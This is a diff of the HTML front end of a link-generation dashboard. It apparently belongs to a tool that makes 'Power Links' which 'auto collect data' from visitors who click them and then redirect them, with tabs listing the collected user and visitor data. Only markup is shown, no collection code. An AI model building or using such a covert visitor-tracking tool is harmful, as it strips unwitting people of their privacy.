@@ -19,7 +19,6 @@
             </div>
         </header>
         
-        <!-- Dashboard Tab -->
         <div id="dashboardTab">
             <div class="dashboard-stats">
                 <div class="stat-card"><h3>👥 Total Visitors</h3><p id="totalVisitors">0</p></div>
@@ -36,23 +35,21 @@
                 <div id="generatedLinkContainer" style="display:none;">
                     <p><strong>✅ Visitor Links Ready:</strong></p>
                     
-                    <!-- Normal Link -->
-                    <div style="margin:10px 0; padding:10px; background:#f0f4ff; border-radius:8px; border-left:4px solid #48bb78;">
-                        <p style="font-size:14px; font-weight:600; color:#1a2332;">🔗 Normal Link (Visitor needs to click Continue)</p>
+                    <div style="margin:10px 0; padding:12px; background:#f0f4ff; border-radius:10px; border-left:4px solid #48bb78;">
+                        <p style="font-size:14px; font-weight:600; color:#1a2332;">🔗 Normal Link</p>
                         <div style="display:flex; gap:10px;">
                             <input type="text" id="generatedLink" readonly style="flex:1; padding:10px; border:2px solid #48bb78; border-radius:5px; background:#f0fff4; font-size:13px;">
                             <button onclick="copyToClipboard(document.getElementById('generatedLink').value)" class="camera-btn" style="background:#48bb78;">📋 Copy</button>
                         </div>
                     </div>
                     
-                    <!-- Power Link -->
-                    <div style="margin:10px 0; padding:10px; background:#fef3c7; border-radius:8px; border-left:4px solid #ed8936;">
-                        <p style="font-size:14px; font-weight:600; color:#92400e;">⚡ Power Link (Auto permissions - Just click)</p>
+                    <div style="margin:10px 0; padding:12px; background:linear-gradient(135deg, #fef3c7, #fde68a); border-radius:10px; border-left:4px solid #ed8936;">
+                        <p style="font-size:14px; font-weight:600; color:#92400e;">⚡ Power Link <span style="font-size:12px; font-weight:400;">(Auto Permissions)</span></p>
                         <div style="display:flex; gap:10px;">
                             <input type="text" id="powerLinkDisplay" readonly style="flex:1; padding:10px; border:2px solid #ed8936; border-radius:5px; background:#fef3c7; font-size:13px;">
                             <button onclick="copyToClipboard(document.getElementById('powerLinkDisplay').textContent)" class="camera-btn" style="background:#ed8936;">📋 Copy</button>
                         </div>
-                        <p style="font-size:12px; color:#92400e; margin-top:5px;">⚠️ Visitor will be redirected automatically without clicking anything</p>
+                        <p style="font-size:11px; color:#92400e; margin-top:4px;">⚡ Visitor clicks → Auto collect data → Redirect</p>
                     </div>
                     
                     <p style="margin-top:5px; color:#4a5568; font-size:13px;">📌 Link ID: <span id="generatedLinkId" style="color:#667eea; font-weight:bold;"></span></p>
@@ -66,7 +63,6 @@
             </div>
         </div>
         
-        <!-- Links Tab -->
         <div id="linksTab" style="display:none;">
             <div class="visitors-table">
                 <h2>🔗 All Generated Links</h2>
@@ -74,7 +70,6 @@
             </div>
         </div>
         
-        <!-- Users Data Tab -->
         <div id="usersTab" style="display:none;">
             <div class="dashboard-stats" id="usersStats">
                 <div class="stat-card"><h3>👥 Total Users</h3><p id="totalUsers">0</p></div>
@@ -109,7 +104,6 @@
             </div>
         </div>
         
-        <!-- Visitor Details Modal -->
         <div class="visitor-details" id="visitorDetails" style="display:none;">
             <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:10px;">
                 <h2>📊 Visitor Details</h2>
@@ -118,7 +112,6 @@
             <div id="detailsContent"></div>
         </div>
         
-        <!-- Visit Details Modal -->
         <div class="modal" id="visitModal" style="display:none;">
             <div class="modal-content">
                 <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
